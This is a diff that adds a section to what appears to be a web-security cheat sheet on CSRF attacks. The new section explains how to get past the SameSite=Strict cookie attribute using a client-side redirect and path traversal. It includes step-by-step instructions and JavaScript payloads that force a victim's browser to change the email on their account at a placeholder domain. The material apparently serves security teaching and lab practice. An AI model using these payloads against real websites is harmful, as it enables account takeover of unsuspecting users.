@@ -150,8 +150,27 @@ To exploit a CSRF token + cookie mechanism, two actions are required:
     document.location = "https://vulnerable.web/my-account/change-email?email=pwned@hacked.com&_method=POST";
 </script>
 ```
-
 --- 
+
+### Strict Bypass Via Client-Side Redirect
+
+If there is a endpoint in website that redirecting to another page of website, you can use this process to bypass strict attribute.
+
+1. **Change request method from POST to GET in Burp**
+2. **Identify a endpoint that redirect the traffic to another page**
+3. **Now copy and paste the request that you changed from POST to GET in the redirection path**
+4. **If possible, you can also use the path traversal technique**
+
+**Example**: https://vulnblog.web/post/comment/confirmation?postId=../my-account. Here, ```postId``` parameter trying a rediction and we are trying to exlploit the change-email functionality in ```/my-account``` page.
+
+**Payload**
+```javascript
+<script>
+    document.location = "https://vulnerable.web/post/comment/confirmation?postId=../my-account/change-email?email=a111%40a.com%26submit=1";
+</script>
+```
+---
+
 ### **Table**
 
 | Attribute         | Sent with Cross-Origin Requests? | Sent on Same-Site Requests? | Notes                                       |
